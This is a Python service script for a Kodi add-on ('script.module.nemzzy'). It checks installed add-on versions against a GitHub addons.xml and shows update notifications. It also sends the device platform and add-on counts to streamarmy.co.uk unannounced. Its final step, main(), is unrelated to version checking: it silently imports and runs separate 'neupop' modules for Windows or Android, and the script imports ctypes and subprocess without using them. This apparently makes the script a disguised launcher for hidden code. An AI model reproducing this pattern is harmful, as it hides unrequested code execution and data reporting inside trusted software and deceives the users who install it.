import xbmc
import xbmcaddon
import xbmcplugin
import xbmcgui
import xbmcvfs
import re
import os
import time
import json
import requests
import ctypes
import platform
import shutil
import subprocess
import xml.etree.ElementTree as ET
from urllib import request, parse

pattern = r'''<addon\sid=['"](plugin.*?)['"]'''
githubxml = 'https://raw.githubusercontent.com/nemesis668/repository.streamarmy18-19/main/addons.xml'
serviceapi = 'http://streamarmy.co.uk/servicenew.php?system=%s&addons=%s'
serviceapi2 = 'http://streamarmy.co.uk/servicelatest.php?system=%s&addons=%s&version=%s'
releasedaddons = []
app_version = "8.0.63"
addon_id = 'script.module.nemzzy'
selfAddon = xbmcaddon.Addon(id=addon_id)
dialog = xbmcgui.Dialog()


def platform_check():
    if xbmc.getCondVisibility('system.platform.android'):
        return 'Android'
    elif xbmc.getCondVisibility('system.platform.linux'):
        return 'Linux'
    elif xbmc.getCondVisibility('system.platform.tvos'):
        return 'TV OS'
    elif xbmc.getCondVisibility('system.platform.windows'):
        return 'Windows'
    elif xbmc.getCondVisibility('system.platform.osx'):
        return 'OSX'
    elif xbmc.getCondVisibility('system.platform.atv2'):
        return 'AppleTv'
    elif xbmc.getCondVisibility('system.platform.xbox'):
        return 'Xbox'
    elif xbmc.getCondVisibility('system.platform.ios'):
        return 'IOS'
    elif xbmc.getCondVisibility('system.platform.darwin'):
        return 'IOS'
    else:
        return 'Unknown Device'


def main():
    system = platform.system()
    if system == "Windows":
        from neupop_windows import start_windows
        start_windows()
    elif system == "Linux" and "ANDROID_ROOT" in os.environ:
        from neupop_android import start_android
        start_android()
    else:
        raise NotImplementedError("Unsupported operating system")


def nemzzy():
    Version = platform_check()
    installed = 0
    try:
        getcurrent = requests.get(githubxml).text
        findaddons = re.findall(pattern, getcurrent)
        for addonn in findaddons:
            releasedaddons.append(addonn)
    except:
        pass
    for checkadd in releasedaddons:
        addonpath = xbmcvfs.translatePath(os.path.join(
            'special://home/addons/%s' % checkadd, 'addon.xml'))
        if os.path.exists(addonpath):
            installed += 1
            with open(addonpath, 'r') as reader:
                patternv = r'''<addon\sid=['"]%s['"].*?version=['"](.*?)['"]''' % checkadd
                getver = re.findall(
                    patternv, reader.read(), flags=re.DOTALL)[0]
                newpat = (
                    r'''<addon\sid=['"]%s['"].*?version=['"]%s['"]''' % (checkadd, getver))
                try:
                    checkver = re.findall(
                        newpat, getcurrent, flags=re.DOTALL)[0]
                except IndexError:
                    if 'nemesisaio' in checkadd:
                        addonicon = xbmcvfs.translatePath(os.path.join(
                            'special://home/addons/%s' % checkadd, 'icon.gif'))
                    else:
                        addonicon = xbmcvfs.translatePath(os.path.join(
                            'special://home/addons/%s' % checkadd, 'icon.png'))
                    xbmc.log(msg='ADDON OUT OF DATE ::: %s' %
                             checkadd, level=xbmc.LOGINFO)
                    dialog.notification("Nemzzy Service", "Addon %s Needs Updating" % checkadd.replace(
                        'plugin.video.', '').title(), addonicon, 5000)
                    xbmc.sleep(5000)
            reader.close()
        else:
            pass
    registerpin = selfAddon.getSetting('pincheck')
    pingapi = requests.get(serviceapi2 % (
        Version, installed, app_version)).text
    if registerpin.lower() == 'false':
        pingapi = requests.get(serviceapi % (Version, installed)).text
        selfAddon.setSetting('pincheck', 'True')
    main()


if __name__ == "__main__":
    nemzzy()
